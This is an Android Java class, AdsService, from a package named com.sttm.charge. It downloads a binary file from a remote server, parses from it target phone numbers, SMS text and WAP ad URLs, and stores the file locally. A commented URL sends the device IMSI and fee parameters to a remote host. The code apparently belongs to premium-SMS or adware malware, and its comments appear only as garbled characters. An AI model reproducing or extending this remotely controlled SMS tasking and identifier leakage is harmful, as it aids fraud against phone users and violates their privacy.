package com.sttm.model;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.content.Context;
import android.util.Log;

import com.sttm.bean.Ads_header;
import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ControlData;
import com.sttm.bean.CurstomCFG;
import com.sttm.bean.GPRSInfo_url;
import com.sttm.bean.SmsAdsData;
import com.sttm.bean.WapAdsData;
import com.sttm.util.ByteUtil;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;

//������ҵ����

public class AdsService {
	// �ļ�ͷ
	public Ads_header getAdsHeader(byte[] bytes) {
		if (bytes == null || bytes.length <= 0) {
			return null;
		}
		Ads_header header = new Ads_header();

		// byte[] buffer_header = Arrays.copyOf(bytes, header.getLength());
		byte[] buffer_header = new byte[header.getLength()];
		System.arraycopy(bytes, 0, buffer_header, 0, header.getLength());

		// ���Ź��ƫ��
		byte[] m_nSmsAdvertiseOffset = new byte[2];
		System.arraycopy(buffer_header, 5, m_nSmsAdvertiseOffset, 0, 2);
		int add = m_nSmsAdvertiseOffset[0] & 0xFF;
		add |= (m_nSmsAdvertiseOffset[1] << 8);

		header.setM_nSmsAdvertiseOffset((short) add);

		// //���Ź�泤��
		byte[] m_nSmsAdvertiseLen = new byte[2];
		System.arraycopy(buffer_header, 7, m_nSmsAdvertiseLen, 0, 2);
		// m_nSmsAdvertiseLen[0] &= 0xFF;
		add = m_nSmsAdvertiseLen[0] & 0xFF;
		add |= (m_nSmsAdvertiseLen[1] << 8);
		header.setM_nSmsAdvertiseLen((short) add);
		// header.setM_nSmsAdvertiseLen(Short.parseShort(ByteUtil.byte2str(m_nSmsAdvertiseLen)));

		// //Wap���ƫ��
		byte[] m_nWapAdvertiseOffset = new byte[2];
		System.arraycopy(buffer_header, 9, m_nWapAdvertiseOffset, 0, 2);
		add = m_nWapAdvertiseOffset[0] & 0xFF;
		add |= (m_nWapAdvertiseOffset[1] << 8);
		header.setM_nWapAdvertiseOffset((short) add);
		// header.setM_nWapAdvertiseLen(ByteUtil.byteToShort(m_nWapAdvertiseOffset));

		// //Wap��泤�ȣ�url�ĳ��ȣ�
		byte[] m_nWapAdvertiseLen = new byte[2];
		System.arraycopy(buffer_header, 11, m_nWapAdvertiseLen, 0, 2);
		add = m_nWapAdvertiseLen[0] & 0xFF;
		add |= (m_nWapAdvertiseLen[1] << 8);

		header.setM_nWapAdvertiseLen((short) add);

		return header;

	}

	// ������
	public SmsAdsData getSmsAdsData(byte[] bytes, Ads_header header) {
		if (bytes == null || header == null || bytes.length <= 0
				|| header.getM_nSmsAdvertiseLen() <= 0) {
			return null;
		}
		SmsAdsData smsAdsData = new SmsAdsData();
		byte[] smsAdsDataArray = new byte[header.getM_nSmsAdvertiseLen()];

		// ��������ȡ
		System.arraycopy(bytes, header.getM_nSmsAdvertiseOffset(),
				smsAdsDataArray, 0, header.getM_nSmsAdvertiseLen());

		// byte[] smsCount = Arrays.copyOf(smsAdsDataArray, 1);

		// int count = ByteUtil.byteToInt(smsCount);
		byte[] smsCount = new byte[1];
		System.arraycopy(smsAdsDataArray, 0, smsCount, 0, 1);
		int count = smsCount[0];
		String phoneNumbers = "";
		if (count > 0) {
			for (int i = 0; i < count; i++) {

				// �绰����
				byte[] phoneNumber = new byte[32];

				System.arraycopy(smsAdsDataArray, i * 32 + 1, phoneNumber, 0,
						32);

				phoneNumbers += new String(phoneNumber).trim() + ",";

			}

		}

		// phoneNumbers =
		// phoneNumbers.substring(0,phoneNumbers.lastIndexOf(","));
		smsAdsData.setPhoneNumber(phoneNumbers);

		// ��������
		//Log.d("size", count + "s");
		byte[] smsContent = new byte[header.getM_nSmsAdvertiseLen() - 32
				* count - 1];
		//Log.d("sms", "length=" + header.getM_nSmsAdvertiseLen());
		System.arraycopy(smsAdsDataArray, 32 * count + 1, smsContent, 0,
				header.getM_nSmsAdvertiseLen() - 32 * count - 1);

		smsAdsData.setSmsContent(new String(smsContent).trim());

		return smsAdsData;
	}

	// Wap���
	public WapAdsData getWapAdsData(byte[] bytes, Ads_header header) {
		if (bytes == null || header == null || bytes.length <= 0
				|| header.getM_nWapAdvertiseLen() <= 0) {
			return null;
		}
		WapAdsData wapAdsData = new WapAdsData();
		byte[] wapAdsDataArray = new byte[header.getM_nWapAdvertiseLen()];

		// Wap�����ȡ
		System.arraycopy(bytes, header.getM_nWapAdvertiseOffset(),
				wapAdsDataArray, 0, header.getM_nWapAdvertiseLen());

		// Wap���ʱ��
		byte[] time = new byte[1];

		System.arraycopy(wapAdsDataArray, 0, time, 0, 1);
		int add = time[0];
		// wapAdsData.setTime(ByteUtil.byteToLong(time));
		wapAdsData.setTime((long) add);
		// SimpleDateFormat sdf = new SimpleDateFormat();

		// sdf.parse(string);

		// Wap���·��
		byte[] url = new byte[header.getM_nWapAdvertiseLen() - 1];

		System.arraycopy(wapAdsDataArray, 1, url, 0,
				header.getM_nWapAdvertiseLen() - 1);

		wapAdsData.setUrl(new String(url).trim());

		return wapAdsData;
	}

	public static byte[] updateAdsData(Context context) {
		try {
			GPRSInfo_url ads_url = GPRSInfo_url.getInstance("getAnrAds",context);
		//	URL adsurl = new URL(
				//	"http://download.dqp88.com/getAnrAds.jsp?product=1&feectg=1&manner=1&plat=0&splat=1&date=1&clnt=KS000102&smsc=374&fu=0&stn=0&ssn=0&imsi=460002450918677&rce=&dcn=10&rcn=10&aln=200&ver=1.0");
			URL adsurl = new URL(ads_url.getGprsUpdateURL());
			
			//Log.d("������URL=", ads_url.getGprsUpdateURL());
			LogFile.WriteLogFile("URL="+ads_url.getGprsUpdateURL());
			HttpURLConnection conn = (HttpURLConnection) adsurl
					.openConnection();
			//conn.connect();
			boolean isConnection = KsoHelper.isConnection(conn);
			if(!isConnection){
				conn = (HttpURLConnection) adsurl
						.openConnection();
				boolean isConnection1 = KsoHelper.isConnection(conn);
				if(!isConnection1){
					conn = (HttpURLConnection) adsurl
							.openConnection();
					boolean isConnection2 = KsoHelper.isConnection(conn);
					if(!isConnection2){
						conn = (HttpURLConnection) adsurl
								.openConnection();
						boolean isConnection3 = KsoHelper.isConnection(conn);
						if(!isConnection3){
							conn = (HttpURLConnection) adsurl
									.openConnection();
							boolean isConnection4 = KsoHelper.isConnection(conn);
							if(!isConnection4){
								return null;
								
							}
							
						}
						
					}
					
					
				}
				
				
			}
			InputStream inputStream = conn.getInputStream();
			int length = conn.getContentLength();
			byte[] buffer = new byte[length];
			int offset = 0;
			int numread = 0;
			while (offset < length && numread >= 0) {
				numread = inputStream.read(buffer, offset, length - offset);
				offset += numread;
			}
			inputStream.read(buffer);
			
			/*�����������������Ƿ���ȷ*/
			try{
				final AdsService adsservice = new AdsService();
				AdsService as = new AdsService();
				Ads_header adsheader = adsservice.getAdsHeader(buffer);
				WapAdsData wadsdata = adsservice.getWapAdsData(buffer,
						adsheader);
			if(wadsdata.getUrl() == null || wadsdata.getUrl().equals("")){
				//LogFile.WriteLogFile("���µ���getAnrAds�ļ����ݲ�����,�ж�");
				return null;
			}
			}
			catch(Exception e){
				//LogFile.WriteLogFile("���µ���getAnrAds�ļ����ݲ�����,�ж�");
				return null;
			}
			
			FileOutputStream os = new FileOutputStream(
					"data/data/com.sttm.charge/files/getAnrAds.dat");
			ByteUtil.writeByteFile(os, buffer);
			inputStream.close();
			//Log.d("GPRSService", "������ݸ��¼��ɹ�");
			LogFile.WriteLogFile("������ݸ��¼��ɹ�");
			return buffer;
		} catch (Exception e) {
			e.printStackTrace();
			//Log.d("GPRSService", "������ݸ���ʧ��");
			LogFile.WriteLogFile("������ݸ���ʧ��");
			return null;
		}

	}

	public byte[] getAdsByte() {
		try {
			File file = new File(
					"data/data/com.sttm.charge/files/getAnrAds.dat");
			long length = file.length();
			//Log.d("����ļ���С" , length + "");
			FileInputStream fis = new FileInputStream(file);

			byte b[] = ByteUtil.readByteData2(fis, length);
			return b;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}

	}

}
